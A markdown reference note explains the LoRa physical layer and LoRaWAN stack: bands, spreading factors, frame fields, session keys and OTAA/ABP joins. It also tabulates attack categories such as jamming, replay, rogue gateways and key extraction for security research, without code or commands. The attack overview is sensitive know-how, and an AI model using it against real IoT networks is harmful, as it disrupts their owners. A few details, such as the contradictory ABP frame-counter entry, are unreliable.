---
title: LoRa/LoRaWAN Protocol Overview - Complete Stack Breakdown
tags: [LoRa, LoRaWAN, protocol-analysis, PHY, MAC, CSS, spreading-factor, LPWAN]
category: LoRa Security
parent: "[[LoRa/README]]"
status: complete
---

# LoRa/LoRaWAN Protocol Overview - Complete Stack Breakdown

> **Purpose**: Comprehensive technical breakdown of LoRa physical layer and LoRaWAN protocol stack, including modulation details, device classes, packet structures, join procedures, and attack surfaces.


# **LORA/LORAWAN - COMPLETE PROTOCOL BREAKDOWN**

## **1. LoRa vs LoRaWAN - Critical Distinction**

**IMPORTANT**: LoRa and LoRaWAN are NOT the same thing!

```
┌──────────────────────────────────────────────────┐
│              LoRa (Physical Layer)               │
│  • Proprietary modulation by Semtech             │
│  • Chirp Spread Spectrum (CSS)                   │
│  • Long range, low power radio                   │
│  • Just the PHY - no protocol!                   │
└──────────────────────────────────────────────────┘
                        │
                        │ Used by
                        ▼
┌──────────────────────────────────────────────────┐
│          LoRaWAN (Network Protocol)              │
│  • Open standard by LoRa Alliance                │
│  • Defines MAC layer, network architecture       │
│  • Security, device management                   │
│  • Uses LoRa PHY (or FSK as alternative)         │
└──────────────────────────────────────────────────┘
```

**Analogy:**
- **LoRa** is like "the radio hardware" (similar to WiFi's OFDM modulation)
- **LoRaWAN** is like "the network protocol" (similar to 802.11 WiFi protocol)

You can use LoRa WITHOUT LoRaWAN (peer-to-peer), but most IoT deployments use LoRaWAN for network management.

---

## **2. ARCHITECTURE OVERVIEW**

### **2.1 LoRaWAN Network Topology**

Unlike WiFi/BLE/Zigbee, LoRaWAN uses a **star-of-stars** topology:

```
                    ┌─────────────────────┐
                    │  APPLICATION SERVER │
                    │  (User's backend)   │
                    └──────────┬──────────┘
                               │
                               │ HTTPS/MQTT
                               │
                    ┌──────────▼──────────┐
                    │   NETWORK SERVER    │
                    │  (LoRa intelligence)│
                    │  • Routing          │
                    │  • ADR              │
                    │  • Deduplication    │
                    └──────────┬──────────┘
                               │
                 ┌─────────────┼─────────────┐
                 │             │             │
              Backhaul      Backhaul     Backhaul
            (IP: WiFi/LTE)(IP: WiFi/LTE)(IP: WiFi/LTE)
                 │             │             │
            ┌────▼────┐   ┌────▼────┐   ┌────▼────┐
            │ GATEWAY │   │ GATEWAY │   │ GATEWAY │
            │  (GW1)  │   │  (GW2)  │   │  (GW3)  │
            └────┬────┘   └────┬────┘   └────┬────┘
                 │             │             │
           LoRa  │       LoRa  │       LoRa  │
                 │             │             │
    ┌────────────┼─────────────┼─────────────┼───────┐
    ▼            ▼             ▼             ▼       ▼
┌───────┐   ┌───────┐     ┌───────┐     ┌───────┐ ┌───────┐
│ Node  │   │ Node  │     │ Node  │     │ Node  │ │ Node  │
│  (A)  │   │  (B)  │     │  (C)  │     │  (D)  │ │  (E)  │
└───────┘   └───────┘     └───────┘     └───────┘ └───────┘
  End Device              End Device              End Device
```

**Key Characteristics:**
- **End Devices (Nodes)**: Battery-powered sensors/actuators
- **Gateways**: Bridge between LoRa (RF) and IP network (WiFi/LTE/Ethernet)
- **Network Server**: Manages network, routes messages, handles security
- **Application Server**: Your application logic, database
- **One message can be received by MULTIPLE gateways** (diversity!)

### **2.2 Complete Protocol Stack**

```
┌─────────────────────────────────────────┐
│     APPLICATION SERVER (Your App)       │
├─────────────────────────────────────────┤
│  APPLICATION LAYER                      │
│  • Custom payload format                │
│  • Encrypted with AppSKey               │
├─────────────────────────────────────────┤
│     ╔═══════════════════════════════╗   │
│     ║      LoRaWAN MAC LAYER        ║   │
│     ║  • Frame structure            ║   │
│     ║  • Commands (LinkCheckReq...)  ║   │
│     ║  • Encrypted with NwkSKey     ║   │
│     ╠═══════════════════════════════╣   │
│     ║   LoRa PHY (Physical Layer)   ║   │
│     ║  • CSS Modulation             ║   │
│     ║  • Sub-GHz ISM bands          ║   │
│     ║  • Spreading Factor (SF7-SF12)║   │
│     ╚═══════════════════════════════╝   │
└─────────────────────────────────────────┘
```

---

## **3. PHYSICAL LAYER (LoRa Modulation)**

### **3.1 Frequency Bands**

LoRa operates in **unlicensed ISM bands** (sub-GHz):

```
┌────────────────────────────────────────────────────────┐
│  REGIONAL FREQUENCY PLANS                              │
├────────────────────────────────────────────────────────┤
│  EU868 (Europe, India, Russia)                         │
│  ├── 863-870 MHz                                       │
│  ├── 8 channels (default)                              │
│  ├── Channel 0: 868.10 MHz                             │
│  ├── Channel 1: 868.30 MHz                             │
│  ├── Channel 2: 868.50 MHz                             │
│  └── Max EIRP: +14 dBm (25 mW) with duty cycle limits  │
├────────────────────────────────────────────────────────┤
│  US915 (North America, South America)                  │
│  ├── 902-928 MHz                                       │
│  ├── 64 uplink channels + 8 downlink channels          │
│  ├── Uplink: 902.3 - 914.9 MHz (200 kHz spacing)       │
│  ├── Downlink: 923.3 - 927.5 MHz (500 kHz spacing)     │
│  └── Max EIRP: +30 dBm (1 W) no duty cycle             │
├────────────────────────────────────────────────────────┤
│  AS923 (Asia, Japan, Australia, New Zealand)           │
│  ├── 915-928 MHz (or 920-925 MHz in some regions)      │
│  ├── 8 channels (similar to EU868 structure)           │
│  └── Max EIRP: +16 dBm (40 mW) with duty cycle         │
├────────────────────────────────────────────────────────┤
│  AU915 (Australia)                                     │
│  ├── 915-928 MHz                                       │
│  └── Similar to US915 structure                        │
├────────────────────────────────────────────────────────┤
│  IN865 (India)                                         │
│  ├── 865-867 MHz                                       │
│  └── 3 default channels                                │
├────────────────────────────────────────────────────────┤
│  CN470 (China)                                         │
│  ├── 470-510 MHz                                       │
│  └── 96 channels                                       │
└────────────────────────────────────────────────────────┘
```

**Why sub-GHz instead of 2.4 GHz?**
- **Better propagation**: Lower frequencies penetrate walls better
- **Longer range**: Less path loss over distance
- **Lower interference**: Less crowded spectrum (no WiFi/BLE/Zigbee)

### **3.2 Chirp Spread Spectrum (CSS) Modulation**

This is what makes LoRa special! Unlike OFDM (WiFi) or GFSK (BLE):

```
TRADITIONAL FSK:
Frequency ▲
          │   ___      ___
          │  |   |    |   |
          │__|___|____|___|____► Time
             Bit 1    Bit 1
          
LoRa CSS CHIRP:
Frequency ▲
          │        ╱╲
          │       ╱  ╲      ╱╲
          │  ____╱    ╲____╱  ╲____► Time
          │ (Linear frequency sweep)
          │ "Chirp" = frequency ramp
```

**Chirp Properties:**
- **Up-chirp**: Frequency increases linearly over time
- **Down-chirp**: Frequency decreases linearly over time
- **Bandwidth (BW)**: 125 kHz, 250 kHz, or 500 kHz
- **Symbol encoded by chirp timing**, not frequency itself!

**Example Chirp:**
```
Symbol Time = 2^SF / BW

For SF7, BW=125kHz:
Symbol Time = 2^7 / 125000 = 128 / 125000 = 1.024 ms

For SF12, BW=125kHz:
Symbol Time = 2^12 / 125000 = 4096 / 125000 = 32.768 ms

Higher SF = Longer symbol time = More processing gain = Longer range
```

### **3.3 Spreading Factor (SF)**

**THE MOST IMPORTANT PARAMETER** for LoRa:

```
┌────┬────────────┬───────────┬─────────┬──────────────┐
│ SF │ Data Rate  │  Range    │ Airtime │ Chip Rate    │
├────┼────────────┼───────────┼─────────┼──────────────┤
│ 7  │ 5.47 kbps  │ ~2 km     │ Short   │ 128 chips/sym│
│ 8  │ 3.13 kbps  │ ~4 km     │   ↓     │ 256 chips/sym│
│ 9  │ 1.76 kbps  │ ~6 km     │   ↓     │ 512 chips/sym│
│ 10 │ 977 bps    │ ~8 km     │   ↓     │ 1024 chips   │
│ 11 │ 537 bps    │ ~11 km    │   ↓     │ 2048 chips   │
│ 12 │ 293 bps    │ ~15 km    │ Long    │ 4096 chips   │
└────┴────────────┴───────────┴─────────┴──────────────┘

Trade-offs:
✓ Higher SF = Longer Range + Better Sensitivity
✗ Higher SF = Slower Data Rate + Longer Airtime + More Battery

CRITICAL: Different SFs are ORTHOGONAL
  → SF7 and SF12 signals don't interfere with each other!
  → Gateway can receive multiple SFs simultaneously
```

**Orthogonality Visualization:**
```
Same Frequency, Different SF:

Channel 868.1 MHz:
├── Node A transmitting at SF7  ━━━━━━━━━━━━━━
├── Node B transmitting at SF10 ━━━━━━━━━━━━━━━━━━━━━━━
└── Node C transmitting at SF12 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

Gateway receives ALL THREE simultaneously! (Like CDMA)
```

### **3.4 Bandwidth**

```
┌───────────┬──────────────┬──────────────────────┐
│ Bandwidth │ Typical Use  │ Effect               │
├───────────┼──────────────┼──────────────────────┤
│ 125 kHz   │ Default      │ Best sensitivity     │
│ 250 kHz   │ Faster data  │ Medium sensitivity   │
│ 500 kHz   │ High speed   │ Lowest sensitivity   │
└───────────┴──────────────┴──────────────────────┘

Wider BW = Faster data rate, but less sensitive
```

### **3.5 Coding Rate**

Forward Error Correction (FEC) for reliability:

```
┌──────────────┬─────────────────┬──────────────────┐
│ Coding Rate  │ Overhead        │ Error Correction │
├──────────────┼─────────────────┼──────────────────┤
│ 4/5          │ 25% extra bits  │ Low              │
│ 4/6          │ 50% extra bits  │ Medium           │
│ 4/7          │ 75% extra bits  │ High             │
│ 4/8          │ 100% extra bits │ Very High        │
└──────────────┴─────────────────┴──────────────────┘

Higher CR = More robust, but slower effective data rate
```

### **3.6 Link Budget Calculation**

```
EXAMPLE: 15+ km range calculation

Transmitter:
├── TX Power: +14 dBm (EU868)
├── TX Antenna Gain: +2 dBi
└── EIRP: +16 dBm

Path Loss (free space):
└── Distance: 15 km
    Path Loss = 32.44 + 20*log10(868) + 20*log10(15)
              = 32.44 + 58.77 + 23.52
              = 114.73 dB

Receiver:
├── RX Antenna Gain: +2 dBi
├── Sensitivity (SF12, BW125): -137 dBm
└── Received Power = +16 - 114.73 + 2 = -96.73 dBm

Link Margin:
└── Margin = -96.73 - (-137) = 40.27 dB ✓ EXCELLENT

Factors reducing margin:
- Building penetration: -20 dB
- Fading margin: -10 dB
- Effective margin: 40.27 - 30 = 10.27 dB ✓ Still good!
```

---

## **4. LoRa PHY PACKET STRUCTURE**

Every LoRa transmission has this structure:

```
┌──────────┬─────────┬─────────────┬─────────┐
│ PREAMBLE │  HEADER │   PAYLOAD   │   CRC   │
└──────────┴─────────┴─────────────┴─────────┘
```

### **4.1 Preamble**

```
Preamble:
├── Length: Programmable (default 8 symbols, can be 6-65535)
├── Purpose: Synchronization, AGC settling, timing recovery
└── Pattern: Up-chirps at SF

Duration (SF12, 8 symbols):
= 8 × 32.768 ms = 262 ms just for preamble!
```

### **4.2 Physical Header (Optional)**

```
┌─────────────────────────────────────────┐
│  PHY Header (EXPLICIT MODE)             │
│  ├── Payload Length (8 bits)            │
│  ├── Coding Rate (3 bits)               │
│  ├── CRC Present (1 bit)                │
│  └── Header CRC (4 bits)                │
└─────────────────────────────────────────┘

or

┌─────────────────────────────────────────┐
│  IMPLICIT MODE (no header)              │
│  • Payload length pre-configured        │
│  • Used for fixed-length payloads       │
└─────────────────────────────────────────┘
```

### **4.3 Payload**

```
Payload = LoRaWAN MAC frame (if using LoRaWAN)
        or Raw data (if peer-to-peer)
        
Max payload size depends on SF and region:
┌────────┬────────────┐
│  SF    │  Max Bytes │
├────────┼────────────┤
│  7-9   │   230      │
│  10    │   230      │
│  11    │   230      │
│  12    │   230      │
└────────┴────────────┘

But LoRaWAN limits are MUCH smaller (see MAC layer)
```

---

## **5. LoRaWAN MAC LAYER**

### **5.1 Device Classes**

LoRaWAN defines THREE device classes:

```
┌──────────────────────────────────────────────────────┐
│                    CLASS A                           │
│  • LOWEST power consumption                          │
│  • Bi-directional                                    │
│  • End Device initiated                              │
│  • Two short RX windows after each TX                │
│  • Most common for sensors                           │
│                                                      │
│  Timing:                                             │
│    TX ─────────►                                     │
│          RX1 ▼ (1 sec delay)                         │
│          RX2 ▼ (2 sec delay)                         │
│              (then sleep)                            │
└──────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────┐
│                    CLASS B                           │
│  • Medium power consumption                          │
│  • Bi-directional                                    │
│  • Scheduled RX windows                              │
│  • Beacon synchronized                               │
│  • Predictable latency                               │
│                                                      │
│  Timing:                                             │
│    Beacon ▼ (every 128 sec)                          │
│       ┌────┬────┬────┬────┐                          │
│    RX │slot│slot│slot│slot│ (scheduled ping slots)   │
│       └────┴────┴────┴────┘                          │
└──────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────┐
│                    CLASS C                           │
│  • HIGHEST power consumption                         │
│  • Bi-directional                                    │
│  • RX window ALWAYS OPEN                             │
│  • Lowest latency downlink                           │
│  • Mains-powered devices                             │
│                                                      │
│  Timing:                                             │
│    RX ═══════════════════════════════════════════    │
│       (continuously listening, except during TX)     │
└──────────────────────────────────────────────────────┘
```

**Comparison:**

| Feature | Class A | Class B | Class C |
|---------|---------|---------|---------|
| **Power** | Ultra-low | Low | High |
| **RX Window** | After TX only | Scheduled slots | Always open |
| **Latency** | High (wait for TX) | Medium | Lowest |
| **Use Case** | Sensors | Actuators | Gateways, mains |
| **Battery Life** | Years | Months | Mains-powered |

### **5.2 LoRaWAN Frame Structure**

```
┌────────────────────────────────────────────────────┐
│           LORAWAN MAC FRAME (MHDR)                 │
│  • MAC Header (1 byte)                             │
├────────────────────────────────────────────────────┤
│           MAC PAYLOAD (variable)                   │
│  • FHDR (Frame Header)                             │
│  • FPort (1 byte, optional)                        │
│  • FRMPayload (encrypted application data)         │
├────────────────────────────────────────────────────┤
│           MIC (Message Integrity Code)             │
│  • 4 bytes                                         │
└────────────────────────────────────────────────────┘
```

### **5.3 MAC Header (MHDR) - 1 byte**

```
Bits:
┌────┬────┬────┬────┬────┬────┬────┬────┐
│  7 │  6 │  5 │  4 │  3 │  2 │  1 │  0 │
├────┴────┴────┼────┴────┴────┼────┴────┤
│   MType      │     RFU      │ Major   │
│   (3 bits)   │   (3 bits)   │ (2 bits)│
└──────────────┴──────────────┴─────────┘

MType (Message Type):
┌──────┬────────────────────────────────────┐
│ Bits │ Message Type                       │
├──────┼────────────────────────────────────┤
│ 000  │ Join Request                       │
│ 001  │ Join Accept                        │
│ 010  │ Unconfirmed Data Up                │
│ 011  │ Unconfirmed Data Down              │
│ 100  │ Confirmed Data Up                  │
│ 101  │ Confirmed Data Down                │
│ 110  │ RFU (Rejoin Request in LoRaWAN 1.1)│
│ 111  │ Proprietary                        │
└──────┴────────────────────────────────────┘

Major: LoRaWAN version (00 = LoRaWAN R1)
```

### **5.4 Frame Header (FHDR)**

```
┌────────────────────────────────────────────┐
│  DevAddr (Device Address) - 4 bytes        │
│  └── 32-bit address assigned during join   │
├────────────────────────────────────────────┤
│  FCtrl (Frame Control) - 1 byte            │
│  ├── ADR (Adaptive Data Rate): 1 bit       │
│  ├── ADRACKReq: 1 bit                      │
│  ├── ACK: 1 bit                            │
│  ├── FPending: 1 bit (Class A downlink)    │
│  └── FOptsLen: 4 bits                      │
├────────────────────────────────────────────┤
│  FCnt (Frame Counter) - 2 bytes            │
│  └── Monotonic counter (replay protection) │
├────────────────────────────────────────────┤
│  FOpts (Frame Options) - 0-15 bytes        │
│  └── MAC commands (optional)               │
└────────────────────────────────────────────┘
```

### **5.5 Complete Data Frame Example**

```
EXAMPLE: Uplink Data Frame (Unconfirmed)

┌─ MAC Header (MHDR) ────────────────────────┐
│ 40                                          │
│ Binary: 0100 0000                           │
│ ├── MType: 010 (Unconfirmed Data Up)       │
│ ├── RFU: 000                                │
│ └── Major: 00 (LoRaWAN R1)                  │
└─────────────────────────────────────────────┘

┌─ Frame Header (FHDR) ──────────────────────┐
│ DevAddr: 26 01 1F 3A                        │
│ FCtrl: 80                                   │
│   Binary: 1000 0000                         │
│   ├── ADR: 1 (enabled)                      │
│   ├── ADRACKReq: 0                          │
│   ├── ACK: 0                                │
│   ├── FPending: 0                           │
│   └── FOptsLen: 0000 (no MAC commands)      │
│ FCnt: 00 0A (Frame counter = 10)            │
│ FOpts: (empty)                              │
└─────────────────────────────────────────────┘

┌─ FPort ─────────────────────────────────────┐
│ 01  (Application port)                      │
└─────────────────────────────────────────────┘

┌─ FRMPayload (Encrypted) ───────────────────┐
│ A3 2F 7B 9E 12 ... (application data)       │
│ Decrypted: {"temperature": 23.5}            │
└─────────────────────────────────────────────┘

┌─ MIC (Message Integrity Code) ─────────────┐
│ 4B 9A C2 D5  (4 bytes)                      │
│ Computed with NwkSKey                       │
└─────────────────────────────────────────────┘

Total Frame:
40 26 01 1F 3A 80 00 0A 01 A3 2F 7B 9E 12 4B 9A C2 D5
```

---

## **6. DEVICE ADDRESSING**

### **6.1 Device Identifiers**

LoRaWAN devices have MULTIPLE identifiers:

```
┌─────────────────────────────────────────────────┐
│  DevEUI (Device Extended Unique Identifier)    │
│  • 64-bit globally unique (like MAC address)    │
│  • Burned into device at manufacturing          │
│  • Example: 70:B3:D5:7E:D0:01:AB:CD            │
│  • Used during join procedure                   │
└─────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────┐
│  AppEUI / JoinEUI (Application Identifier)     │
│  • 64-bit application identifier                │
│  • Identifies application server                │
│  • Example: 00:00:00:00:00:00:00:01            │
│  • Used during join procedure                   │
└─────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────┐
│  DevAddr (Device Address)                       │
│  • 32-bit network address                       │
│  • Assigned by Network Server during join       │
│  • Example: 0x26011F3A                          │
│  • Used in every data frame                     │
│  • NOT globally unique (only within network)    │
│  • Format: [7-bit NwkID][25-bit NwkAddr]        │
└─────────────────────────────────────────────────┘

DevAddr Structure:
┌────────────────┬─────────────────────────────┐
│   NwkID        │        NwkAddr              │
│   (7 bits)     │        (25 bits)            │
│   Network ID   │  Address within network     │
└────────────────┴─────────────────────────────┘
  Identifies the      Unique device in
  LoRaWAN network     that network
```

---

## **7. SECURITY ARCHITECTURE**

### **7.1 Security Keys**

LoRaWAN uses **THREE** AES-128 keys:

```
┌──────────────────────────────────────────────────┐
│              AppKey (Application Key)            │
│  • 128-bit root key                              │
│  • Pre-shared secret                             │
│  • Unique per device                             │
│  • NEVER transmitted over the air!               │
│  • Stored in device + Application Server         │
│  • Used to derive session keys                   │
└──────────────────────────────────────────────────┘
                    │
         During OTAA join, derives:
                    │
      ┌─────────────┴──────────────┐
      ▼                            ▼
┌───────────────────┐    ┌────────────────────┐
│  NwkSKey          │    │    AppSKey         │
│ (Network Session) │    │ (Application       │
│                   │    │  Session Key)      │
└───────────────────┘    └────────────────────┘

┌──────────────────────────────────────────────────┐
│           NwkSKey (Network Session Key)          │
│  • 128-bit session key                           │
│  • Derived from AppKey during join               │
│  • Used for MIC calculation (integrity)          │
│  • Ensures frame authenticity                    │
│  • Network Server has this key                   │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│       AppSKey (Application Session Key)          │
│  • 128-bit session key                           │
│  • Derived from AppKey during join               │
│  • Used for payload encryption                   │
│  • Application Server has this key               │
│  • End-to-end encryption (NS can't see payload)  │
└──────────────────────────────────────────────────┘
```

**Key Security Properties:**
- **End-to-End Encryption**: Network Server sees headers, NOT payload
- **Payload**: Encrypted with AppSKey (only End Device + App Server)
- **MIC**: Computed with NwkSKey (Network Server can verify)

### **7.2 Encryption Algorithm**

```
Algorithm: AES-128 in Counter (CTR) Mode
Block Size: 128 bits (16 bytes)

Encryption Stream Generation:
┌────────────────────────────────────────┐
│ Direction (0x00 = uplink, 0x01 = down) │
│ DevAddr (4 bytes)                      │
│ FCnt (4 bytes, zero-padded from 2B)    │
│ 0x00 (1 byte)                          │
│ Block Counter (1 byte, starts at 0x01) │
└────────────────────────────────────────┘
         │
         │ AES-128 Encrypt with AppSKey
         ▼
    Keystream Block
         │
         │ XOR with Plaintext
         ▼
     Ciphertext

MIC Calculation (AES-CMAC):
Input: MHDR | FHDR | FPort | FRMPayload
Key: NwkSKey
Output: 4-byte MIC
```

---

## **8. JOIN PROCEDURES**

LoRaWAN has TWO ways to join a network:

### **8.1 OTAA (Over-The-Air Activation) - RECOMMENDED**

```
PHASE 1: JOIN REQUEST
──────────────────────────────────────────────────────
End Device                        Network Server
    │                                     │
    │─── Join Request ────────────────────→│
    │    [AppEUI, DevEUI, DevNonce]        │
    │    MIC: cmac(AppKey, msg)            │
    │                                     │
    │    (Gateway forwards to NS)          │
    │                                     │

Join Request Frame:
┌────────────────────────────────────────────┐
│ MHDR: 0x00 (Join Request)                  │
│ AppEUI: 00 00 00 00 00 00 00 01 (8 bytes)  │
│ DevEUI: 70 B3 D5 7E D0 01 AB CD (8 bytes)  │
│ DevNonce: 3A 2F (2 bytes, random)          │
│ MIC: 4B 9A C2 D5 (4 bytes)                 │
└────────────────────────────────────────────┘

PHASE 2: JOIN ACCEPT
──────────────────────────────────────────────────────
    │                                     │
    │←── Join Accept ──────────────────────│
    │    [AppNonce, NetID, DevAddr,        │
    │     DLSettings, RxDelay, CFList]     │
    │    **ENCRYPTED with AppKey!**        │
    │                                     │
    │    (NS sends via Gateway)            │
    │                                     │

Join Accept Frame (encrypted!):
┌────────────────────────────────────────────┐
│ MHDR: 0x20 (Join Accept)                   │
│ [Encrypted Payload with AppKey]:           │
│   AppNonce: 3 bytes (from NS)              │
│   NetID: 3 bytes                           │
│   DevAddr: 4 bytes (assigned!)             │
│   DLSettings: 1 byte                       │
│   RxDelay: 1 byte                          │
│   CFList: 16 bytes (optional)              │
│ MIC: 4 bytes                                │
└────────────────────────────────────────────┘

PHASE 3: DERIVE SESSION KEYS
──────────────────────────────────────────────────────
    │                                     │
    │  [Both compute NwkSKey and AppSKey] │
    │                                     │
    NwkSKey = aes128_encrypt(AppKey,     
              0x01 | AppNonce | NetID | DevNonce | pad)
              
    AppSKey = aes128_encrypt(AppKey,
              0x02 | AppNonce | NetID | DevNonce | pad)
    │                                     │
    │  [Ready for encrypted communication]│
```

**OTAA Security Benefits:**
- ✓ Session keys unique per join
- ✓ DevNonce prevents replay attacks
- ✓ AppKey never transmitted
- ✓ Re-join generates new session keys

### **8.2 ABP (Activation By Personalization)**

```
ABP: Pre-configured (NO join procedure)

Device Pre-programmed with:
├── DevAddr (static, assigned beforehand)
├── NwkSKey (fixed, pre-shared)
└── AppSKey (fixed, pre-shared)

Workflow:
End Device ─── Data Frame ──────→ Network Server
            (immediately)
            
No join request, just start sending!
```

**ABP Security Concerns:**
- ✗ Fixed session keys (never refreshed)
- ✗ Frame counter resets if device power-cycled → replay vulnerability!
- ✗ Device replacement = manual key update
- ✓ Faster (no join latency)
- ✓ Simpler (good for testing)

**Recommendation**: Use OTAA in production, ABP only for testing!

---

## **9. MAC COMMANDS**

MAC commands are sent in FOpts field or FRMPayload (FPort=0):

### **9.1 Common MAC Commands**

```
┌──────────────────┬──────┬──────────┬────────────────────┐
│ Command          │ CID  │Direction │ Purpose            │
├──────────────────┼──────┼──────────┼────────────────────┤
│ LinkCheckReq     │ 0x02 │ Up       │ Check connectivity │
│ LinkCheckAns     │ 0x02 │ Down     │ Return link margin │
│ LinkADRReq       │ 0x03 │ Down     │ Change data rate   │
│ LinkADRAns       │ 0x03 │ Up       │ ACK data rate      │
│ DutyCycleReq     │ 0x04 │ Down     │ Set duty cycle     │
│ DutyCycleAns     │ 0x04 │ Up       │ ACK duty cycle     │
│ RXParamSetupReq  │ 0x05 │ Down     │ Change RX params   │
│ RXParamSetupAns  │ 0x05 │ Up       │ ACK RX params      │
│ DevStatusReq     │ 0x06 │ Down     │ Request device info│
│ DevStatusAns     │ 0x06 │ Up       │ Battery + SNR      │
│ NewChannelReq    │ 0x07 │ Down     │ Add channel        │
│ NewChannelAns    │ 0x07 │ Up       │ ACK new channel    │
│ RXTimingSetupReq │ 0x08 │ Down     │ Change RX timing   │
│ RXTimingSetupAns │ 0x08 │ Up       │ ACK RX timing      │
└──────────────────┴──────┴──────────┴────────────────────┘
```

### **9.2 Adaptive Data Rate (ADR)**

Network Server can optimize device transmission parameters:

```
ADR Process:
1. Device sends LinkCheckReq (or ADR bit set)
2. Network Server monitors link quality
3. NS sends LinkADRReq to change SF/TXPower
4. Device acknowledges with LinkADRAns

Example LinkADRReq:
┌────────────────────────────────────┐
│ CID: 0x03                          │
│ DataRate_TXPower:                  │
│   └── DR: SF9 (was SF12)           │
│   └── TXPower: +14 dBm (was +20)   │
│ ChMask: 0x00FF (channels 0-7 ON)   │
│ Redundancy: 0 retransmissions      │
└────────────────────────────────────┘

Benefits of ADR:
✓ Maximize data rate when signal is good
✓ Minimize airtime (less battery + more capacity)
✓ Reduce interference
```

---

## **10. COMPARISON: LoRa/LoRaWAN vs WiFi/BLE/Zigbee**

| Aspect | WiFi | BLE | Zigbee | LoRa/LoRaWAN |
|--------|------|-----|--------|--------------|
| **Standard** | IEEE 802.11 | Bluetooth SIG | IEEE 802.15.4 | LoRa Alliance |
| **Frequency** | 2.4/5 GHz | 2.4 GHz | 2.4 GHz | Sub-GHz (868/915 MHz) |
| **Modulation** | OFDM | GFSK | O-QPSK | CSS (Chirp Spread Spectrum) |
| **Data Rate** | 54 Mbps+ | 1-2 Mbps | 250 kbps | 0.3-50 kbps |
| **Range** | 50-100m | 10-100m | 10-100m (mesh) | 2-15+ km |
| **Topology** | Star | Star | Mesh | Star-of-stars |
| **Power** | High | Ultra-low | Low | Ultra-low |
| **Battery Life** | Hours | Months-Years | Months-Years | Years (5-10+) |
| **Latency** | ms | ms | ms-sec | Seconds |
| **Addressing** | MAC (6 B) | BD_ADDR (6 B) | IEEE (8 B) | DevEUI (8 B) + DevAddr (4 B) |
| **Security** | WPA2/WPA3 | AES-CCM | AES-CCM* | AES-128 (CTR + CMAC) |
| **Use Case** | Internet | Wearables | Home automation | Wide-area IoT |
| **Scalability** | ~50 devices | ~7 devices | ~65k devices | ~1M devices/gateway |

---

## **11. ATTACK SURFACES FOR YOUR ML RESEARCH**

Based on the protocol breakdown, here are LoRaWAN attack categories:

### **11.1 Physical Layer Attacks**
| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **Wide-band Jamming** | PHY | Transmit noise across entire band | Easy |
| **Selective Jamming** | PHY | Jam specific channels/SF | Medium |
| **Preamble Jamming** | PHY | Transmit during preamble | Medium |
| **ACK Jamming** | PHY | Jam downlink RX windows | Hard |
| **Collision Attack** | PHY | Transmit at same time/channel | Easy |

### **11.2 Join Procedure Attacks**
| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **Join Request Flood** | MAC | Spam fake join requests | Easy |
| **Join Accept Spoofing** | MAC | Send fake join accept (needs AppKey!) | Very Hard |
| **Replay Join** | MAC | Replay captured join request | Easy (but ineffective due to DevNonce) |
| **Rogue Gateway** | Network | Fake gateway to capture traffic | Medium |

### **11.3 Frame Manipulation Attacks**
| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **Frame Replay** | MAC | Replay captured frames | Medium (blocked by FCnt) |
| **Bit-Flipping** | MAC | Modify encrypted payload bits | Hard (MIC detection) |
| **ACK Spoofing** | MAC | Send fake ACK for confirmed data | Medium |
| **MAC Command Injection** | MAC | Inject malicious MAC commands | Very Hard (needs NwkSKey) |

### **11.4 Network Layer Attacks**
| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **ADR Manipulation** | Network | Force device to bad SF | Very Hard (needs keys) |
| **DevAddr Spoofing** | Network | Impersonate device | Very Hard (needs keys) |
| **Selective Forwarding** | Gateway | Malicious gateway drops packets | Medium |
| **Wormhole** | Network | Tunnel frames between locations | Hard |

### **11.5 Key Extraction Attacks**
| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **Firmware Extraction** | Device | Extract keys from flash memory | Medium |
| **Side-Channel** | Device | Power analysis during crypto | Very Hard |
| **Weak Key Generation** | Device | Exploit poor RNG | Medium |
| **ABP Static Keys** | Device | Target ABP devices with fixed keys | Easy |

### **11.6 Denial of Service Attacks**
| Attack | Target | Mechanism | Difficulty |
|--------|--------|-----------|------------|
| **Airtime Saturation** | Network | Transmit continuously | Easy |
| **Battery Drain** | Device | Force Class C mode, constant RX | Hard |
| **Confirmed Frame Spam** | Device | Request ACKs, drain battery | Medium |
| **Gateway Overload** | Gateway | Overwhelm processing capacity | Medium |

---

## **12. KNOWN VULNERABILITIES**

### **12.1 Weak Frame Counter Management (ABP)**
```
Problem: ABP devices with persistent frame counter
Attack: Power-cycle device → FCnt resets to 0 → replay old frames
Impact: Replay attacks possible
Solution: Use OTAA or implement persistent FCnt storage
```

### **12.2 Join Request Fingerprinting**
```
Problem: Join Request reveals DevEUI in plaintext
Attack: Track device movements by monitoring join requests
Impact: Privacy violation
Solution: LoRaWAN 1.1 adds JoinEUI encryption
```

### **12.3 Lack of Downlink Confidentiality**
```
Problem: Gateway can see all downlink metadata
Attack: Malicious gateway monitors which devices get downlinks
Impact: Traffic analysis
Solution: Use LoRaWAN 1.1 with separate NwkSKey
```

### **12.4 Collision-Based DoS**
```
Problem: No collision avoidance (pure ALOHA)
Attack: Transmit at same time as victim device
Impact: Packet loss, no retransmission for unconfirmed data
Solution: Use confirmed frames or application-level ACKs
```

### **12.5 Duty Cycle Bypass**
```
Problem: EU868 has 1% duty cycle limit per device
Attack: Multiple devices spoofing different DevAddrs
Impact: Spectrum saturation
Solution: Network-level anomaly detection
```

---

## **13. TOOLS FOR LoRa/LoRaWAN RESEARCH**

### **13.1 Hardware**

```
┌──────────────────────────────────────────────────┐
│  SX1276/SX1278 (Semtech LoRa Transceiver)        │
│  • The actual LoRa chip                          │
│  • Frequency: 137-1020 MHz                       │
│  • Output Power: +20 dBm (100 mW)                │
│  • Sensitivity: -148 dBm (SF12, BW125)           │
│  • Available on breakout boards (~$5-15)         │
└──────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────┐
│  Dragino LoRa/GPS HAT (for Raspberry Pi)         │
│  • SX1276/SX1278 + GPS                           │
│  • Direct Pi integration                         │
│  • ~$30-40                                       │
│  • Great for node or gateway                     │
└──────────────────────────────────────────────────┘

